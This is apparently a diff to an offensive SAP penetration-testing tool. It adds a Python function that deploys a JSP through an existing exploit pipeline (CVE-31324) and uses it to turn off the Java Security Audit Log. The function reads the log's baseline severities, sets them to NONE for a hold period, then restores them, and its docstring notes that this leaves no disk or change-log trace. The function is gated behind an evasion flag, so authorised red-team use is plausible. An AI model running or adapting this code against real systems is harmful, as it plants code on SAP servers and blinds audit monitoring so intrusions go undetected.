@@ -1128,3 +1128,152 @@ def tier3_capture_baseline_only(state, node, creds=None) -> dict:
             "snapshot_loot": snap.loot_path,
             "param_count": len(snap.params),
             "filter_row_count": len(snap.sal_filter_rows)}
+
+
+# ---------------------------------------------------------------------------
+# Java Security Audit Log suppression
+# ---------------------------------------------------------------------------
+
+def tier3_java_sal_suppress(state, node,
+                              hold_seconds: float = 30.0) -> dict:
+    """Suppress the Java Security Audit Log via deployed LogController JSP.
+
+    Deploys a small JSP that calls ``Category.setEffectiveSeverity(
+    Severity.NONE)`` on the 5 SAL subcategories plus the parent
+    ``/System/Security/Audit`` category.  Changes are runtime-only
+    (JVM heap) — no disk persistence, no NWA change-log entry, auto-
+    restored on JVM restart.
+
+    Flow:
+      1. Gate check (``--allow-evasion`` + baseline not required since
+         the Java baseline is captured via HTTP, not RFC).
+      2. Deploy ``logctl.jsp`` (reuses existing CVE-31324 / CTC / telnet
+         / GW pipeline).
+      3. ``?action=read`` → capture baseline severities.
+      4. ``?action=suppress`` → set all to ``Severity.NONE``.
+      5. Sleep ``hold_seconds``.
+      6. ``?action=restore&baselines=...`` → restore baseline.
+
+    No ``evasion_window`` — the Java function manages its own baseline
+    and restore lifecycle directly via HTTP.
+    """
+    import time as _time
+    technique = "java_nwa_severity"
+    try:
+        assert_evasion_allowed(state, node, technique,
+                                require_baseline=False)
+    except EvasionGateError as e:
+        return _wrap_result(technique, False, error=str(e))
+
+    if "JAVA" not in (getattr(node, "system_type", "") or "").upper():
+        return _wrap_result(technique, False,
+                             error="not a Java/dual-stack system")
+
+    sid = getattr(node, "sid", "?")
+
+    # Step 1 — deploy the logctl JSP.
+    from sap_java_logctl import deploy_logctl_jsp, invoke_logctl, baselines_to_wire
+
+    jsp_url = deploy_logctl_jsp(node)
+    if not jsp_url:
+        return _wrap_result(technique, False,
+                             error="logctl JSP deployment failed")
+
+    # Step 2 — read baseline severities.
+    print(f"[*] {sid}: reading Java SAL baseline severities …")
+    baseline = invoke_logctl(jsp_url, "read")
+    if not baseline["ok"]:
+        return _wrap_result(technique, False,
+                             error=f"baseline read failed: "
+                                    f"{baseline.get('error', '?')}",
+                             jsp_url=jsp_url)
+    baseline_cats = baseline["categories"]
+    print(f"[+] {sid}: baseline captured — "
+          f"{len(baseline_cats)} categories:")
+    for cat, sev in baseline_cats.items():
+        print(f"[+] {sid}:   {cat} = {sev}")
+
+    # Step 3 — suppress.
+    print(f"[*] {sid}: suppressing Java SAL (setting Severity.NONE) …")
+    suppress = invoke_logctl(jsp_url, "suppress")
+    if not suppress["ok"]:
+        return _wrap_result(technique, False,
+                             error=f"suppress failed: "
+                                    f"{suppress.get('error', '?')}",
+                             jsp_url=jsp_url,
+                             baseline=baseline_cats)
+    print(f"[+] {sid}: Java SAL suppressed — "
+          f"OK={suppress['suppress_ok']}, FAIL={suppress['suppress_fail']}")
+
+    # Verify the suppress took effect.
+    verify = invoke_logctl(jsp_url, "read")
+    if verify["ok"]:
+        all_none = all(v == 0 or str(v) == "0"
+                       for v in verify["categories"].values())
+        # Severity.NONE might be a large int, not 0.  Check if all
+        # values changed from baseline.
+        changed = sum(1 for cat in baseline_cats
+                      if verify["categories"].get(cat) != baseline_cats[cat])
+        print(f"[+] {sid}: verify-read — {changed}/{len(baseline_cats)} "
+              f"categories changed from baseline")
+    else:
+        print(f"[!] {sid}: verify-read failed: {verify.get('error', '?')}")
+
+    try:
+        from sapmap_findings import emit_finding
+        emit_finding(
+            "INFO", sid,
+            f"Tier 3: Java SAL suppressed — {suppress['suppress_ok']} "
+            f"categories set to Severity.NONE via LogController API "
+            f"(runtime-only, no disk persistence)")
+    except Exception:
+        pass
+
+    # Step 4 — hold.
+    if hold_seconds > 0:
+        print(f"[*] {sid}: holding Java SAL suppress for "
+              f"{hold_seconds}s …")
+        _time.sleep(max(0.0, float(hold_seconds)))
+
+    # Step 5 — restore.
+    print(f"[*] {sid}: restoring Java SAL baseline …")
+    wire = baselines_to_wire(baseline_cats)
+    restore = invoke_logctl(jsp_url, "restore", baselines=wire)
+    if restore["ok"]:
+        print(f"[+] {sid}: Java SAL restored — "
+              f"OK={restore['suppress_ok']}, FAIL={restore['suppress_fail']}")
+    else:
+        print(f"[!] {sid}: Java SAL restore FAILED: "
+              f"{restore.get('error', '?')}")
+
+    # Post-restore verify.
+    post_verify = invoke_logctl(jsp_url, "read")
+    restored_count = 0
+    if post_verify["ok"]:
+        for cat, orig_sev in baseline_cats.items():
+            if post_verify["categories"].get(cat) == orig_sev:
+                restored_count += 1
+        print(f"[+] {sid}: post-restore verify — "
+              f"{restored_count}/{len(baseline_cats)} categories "
+              f"back to baseline")
+
+    try:
+        from sapmap_findings import emit_finding
+        emit_finding("INFO", sid,
+                     f"Tier 3: Java SAL restored — "
+                     f"{restored_count}/{len(baseline_cats)} categories "
+                     f"back to baseline severity")
+    except Exception:
+        pass
+
+    return _wrap_result(
+        technique, True,
+        jsp_url=jsp_url,
+        baseline=baseline_cats,
+        suppress_ok=suppress["suppress_ok"],
+        suppress_fail=suppress["suppress_fail"],
+        hold_seconds=hold_seconds,
+        restore_ok=restore.get("suppress_ok", 0),
+        restore_fail=restore.get("suppress_fail", 0),
+        restored_count=restored_count,
+        baseline_count=len(baseline_cats))
